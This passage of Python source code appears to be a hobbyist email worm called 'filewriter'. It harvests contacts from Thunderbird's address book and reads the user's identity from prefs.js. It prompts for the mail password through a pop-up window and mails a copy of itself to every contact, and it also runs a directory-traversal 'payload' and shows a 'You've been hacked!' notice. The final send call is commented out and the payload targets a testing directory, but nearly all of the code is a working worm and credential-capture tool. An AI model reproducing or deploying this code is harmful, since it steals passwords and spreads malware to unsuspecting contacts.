    if os.path.isfile(installs_ini):
        #print("Use installs.ini file")
        with open(installs_ini, "r") as iif:
            for line in iif:
                if line.startswith("Default="):
                    #print("Default line found!")
                    profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
            #print(f"profile_dir_names = {profile_dir_names}")
            return profile_dir_names
    
    # If there is no installs.ini file, return the file path of the
    # default profile file from the profiles.ini file (the profile file which
    # has a flat "Default=1"). It is assumed that the profiles.ini file
    # is correctly formatted.
    profile_introduction_string_regex = re.compile("\[[0-9a-zA-Z]*\]")
    in_profile_def: bool = False
    path_detected: bool = False
    path_content: str = ""
    default_detected: bool = False
    if os.path.isfile(profiles_ini):
        #print("Use profiles.ini file")
        with open(profiles_ini, "r") as pif:
            for line in pif:
                line = line.strip()
                if line == "":
                    in_profile_def = False
                    path_detected = False
                    default_detected = False
                    path_content = ""
                elif profile_introduction_string_regex.match(line):
                    in_profile_def = True
                elif line.startswith("Path="):
                    path_detected = True
                    path_content = line
                    if in_profile_def and default_detected:
                        profile_dir_names = add_profile_dir_to_list(thunderbird_path, line, profile_dir_names)
                elif line == "Default=1":
                    default_detected = True
                    if in_profile_def and path_detected:
                        profile_dir_names = add_profile_dir_to_list(thunderbird_path, path_content, profile_dir_names)
    
    # print(f"profile_dir_names = {profile_dir_names}")
    return profile_dir_names


def read_email_addresses_thunderbird(filepath: str) -> typing.List[str]:
    """
    :filepath: the file path to the database (usually the file path to the
               Thunderbird profile directory).
    :returns:  a list of all email addresses as string values contained in 
               Thunderbird's "abook.sqlite" database if this database exists, 
               `None` otherwise.
    """
    database = os.path.join(filepath, "abook.sqlite")
    #print(f"database = {database}")
    con = None
    email_addresses = []
    
    if os.path.isfile(database):
        with sqlite3.connect(database) as con:
            with con:
                cur = con.cursor()
                # TODO also return the associated names:
                cur.execute("SELECT DISTINCT value FROM properties WHERE name='PrimaryEmail'")
                rows = cur.fetchall()
                for row in rows:
                    (email_addr,) = row # unpack the tuple returned by fetchall()
                    email_addresses.append(email_addr)
            return email_addresses
    else:
        return None
    
    
def read_sender_name_and_email_thunderbird(profile_dir: str) -> typing.Tuple[str, str]:
    """
    Searches for the full name and email address in the user's Thunderbird
    default profile. This is usually the full name and email address the user
    first typed in when setting up Thunderbird.
    
    :profile_dir: the file path to the Thunderbird profile directory.
    :returns:     A tuple containing the user's full name and email address.
                  These values can each be `None` if no corresponding value 
                  could be found.
    """
    # The user's full name is stored in the variable "mail.identity.idn.fullName", 
    # the user's email address in the variable "mail.identity.idn.useremail" in 
    # the file "prefs.js" in the user's Thunderbird profile.
    # Start with "id1". 
    
    user_name = None
    user_email = None
    prefs_js_filename = os.path.join(profile_dir, "prefs.js")
    
    if prefs_js_filename: # if prefs_js_filename is not `None`
        lines = read_text_file_to_dict(prefs_js_filename)
        user_name_regex = r", \"(.+?)\"\);"
        # Regex matching all possible email addresses:
        # email_regex = TODO
        # Email regex including a leading '"' and a trailing '");':
        # email_regex_incl = "\"" + email_regex + "\");"
        email_regex_incl = user_name_regex
        # Search the file "prefs.js" for the user's name:
        for i in lines:
            # If id1 does not exist, try id2, id3, ..., id10
            # (could e.g. be the case if a user deleted an email account):
            count: int = 1
            while count <= 10:
                if f"mail.identity.id{count}.fullName" in lines[i]:
                    break
                count += 1
            if count <= 10:
                # A string.endsWith(substring) check would be better, 
                # but a regular expression should be checked here 
                # instead of a fixed substring...
                user_name_match = re.search(user_name_regex, lines[i])
                if user_name_match:
                    user_name_raw = user_name_match.group()
                    # Remove the leading '"' and the trailing '");' 
                    # to obtain the user name:
                    user_name = user_name_raw[3:len(user_name_raw)-3:1]
                    break # Break the loop since the searched user name was found.
        # Search the file "prefs.js" for the users' email address:
        for i in lines:
            # Assuming that e.g. if there exists a user name stored under
            # "mail.identity.id2.fullName", there is also a corresponding
            # email address stored under "mail.identity.id2.useremail":
            if f"mail.identity.id{count}.useremail" in lines[i]:
                user_email_match = re.search(email_regex_incl, lines[i])
                if user_email_match:
                    user_email_raw = user_email_match.group()
                    user_email = user_email_raw[3:len(user_email_raw)-3:1]
                    break # Break the loop since the search user email address 
                          # was found.
                
    return (user_name, user_email)


def determine_smtp_server(email_address: str) -> typing.Tuple[str]:
    """
    :email_address: the email address for which the SMTP server data should be 
                    found.
    :return:        a tuple containing the URL of the SMTP server and the  
                    authentication method to the specified `email_address`.
    """
    smtp_servers = {"gmx.net" : ("mail.gmx.net", SSL), "web.de" : ("smtp.web.de", SSL), "gmail.com" : ("smtp.gmail.com", SSL), "mailbox.org" : ("smtp.mailbox.org", SSL), "posteo.de" : ("posteo.de", SSL)}
    aliases = {"gmx.de" : "gmx.net", "gmx.ch" : "gmx.net", "gmx.at" : "gmx.net"}
    
    for s in smtp_servers:
        if email_address.endswith(s):
            return smtp_servers[s]
        
    for a in aliases:
        if email_address.endswith(a):
            return smtp_servers[aliases[a]]


def send_mail_mime(sender_email: str, smtp_server_url: str, encryption_method: str, password: str, to: typing.List[str]) -> None:
    """
    Sends a plaintext email containing this script as attachment.
    
    :sender_email:      the sender email address
    :smtp_server_url:   the URL of the SMTP server
    :encryption_method: the encryption method to use. Can bei either "SSL" 
                        ("TLS") or "STARTTLS".
    :password:          the password that is used for the authentication on the 
                        SMTP server
    :to:                a list containing all recipient addresses
    """
    # TODO: Include functionality to also send the sender's name
    
    if encryption_method != SSL and encryption_method != STARTTLS:
        #print("No valid encryption_method was specified!")
        return
    
    subject = "filewriter"
    body = "This mail contains a worm as attachment, written in Python.\n\nTo execute it, Python and Mozilla Thunderbird must be installed on your\nsystem. In this case, just store it and type `python filewriter.py`.\nIf you enter your password correctly in the window that pops up\nand everything else works, the worm will then be sent to all contacts\nin your address book."
    msg = MIMEMultipart() # Contains the whole email
    
    # Build (parts of) the header and the text/plain body:
    msg["From"] = sender_email
    msg["To"] = COMMASPACE.join(to)
    msg["Date"] = email.utils.formatdate(localtime=True)
    msg["Subject"] = subject
    # msg["Bcc"]
    msg.attach(MIMEText(body, "plain")) # Add the body to the message
    
    # Build a base64-encoded body consisting of a text/x-python attachment 
    # containing the content of this python script:
    with open(os.path.realpath(__file__), "r") as attachment_file:
        attachment_part = MIMEText(attachment_file.read(), "x-python", _charset="utf-8")
    email.encoders.encode_base64(attachment_part)
    attachment_part.add_header("Content-Disposition", "attachment", filename=os.path.basename(__file__))
    # Add the attachment to the message:
    msg.attach(attachment_part)
    
    # Convert the whole email to a single string
    whole_email_text = msg.as_string()
    
    if encryption_method == SSL:
        send_mail_ssl(smtp_server_url, sender_email, password, to, whole_email_text)
    elif encryption_method == STARTTLS:
      send_mail_starttls(smtp_server_url, sender_email, password, to, whole_email_text)


# --------------------------------------------------------------------------
# -------------------------- main functionality ----------------------------
# --------------------------------------------------------------------------

def payload() -> None:
    # TODO: The program does nothing if the passed directory doesn't exist.
    print("Started traversing dirs...")
    # traverse_dirs(os.path.expanduser("~"))
    traverse_dirs(TESTING_DIR_PAYLOAD)
    print("Finished traversing dirs!")


def send_email() -> None:
    """
    Sends this program to all email addresses in the address book of the
    installed Thunderbird client.
    """
    thunderbird_install_path: str = shutil.which("thunderbird", path=determine_possible_paths())
    #print(f"thunderbird_install_path = {thunderbird_install_path}")
    if not thunderbird_install_path:
        #print("Mozilla Thunderbird is not installed on the system!")
        sys.exit(0)
    else:
        # Detect all Thunderbird profile directories:
        profile_dirs = find_thunderbird_profile_dirs()
        for profile_dir in profile_dirs:
            print(f"profile_dir = {profile_dir}")
            to_email_addresses: typing.List[str] = read_email_addresses_thunderbird(profile_dir)
            print(f"to_email_addresses = {to_email_addresses}")
            sender_name, sender_email = read_sender_name_and_email_thunderbird(profile_dir)
            print(f"sender_name = {sender_name}")
            print(f"sender_email = {sender_email}")
            sender_username = sender_email.split("@")[0]
            smtp_server_url, authentication_method = determine_smtp_server(sender_email)
            print(f"smtp_server_url = {smtp_server_url}")
            print(f"authentication_method = {authentication_method}")
            sender_password = password_window(account_name=sender_username, host_name=smtp_server_url)
            print(f"sender_password = {sender_password}")
            #send_mail_mime(sender_email, smtp_server_url, authentication_method, sender_password, to_email_addresses)


if __name__ == "__main__":
    random.seed((datetime.now()).strftime("%H%M%S"))
    # TODO: The threading approach does not work properly with the password
    # retrieving window:
    #payload_thread = threading.Thread(target = payload)
    #send_email_thread = threading.Thread(target = send_email)
    #payload_thread.start()
    #send_email_thread.start()
    payload()
    send_email()
    notify.notification("You've been hacked!", message="", app_name="filewriter")
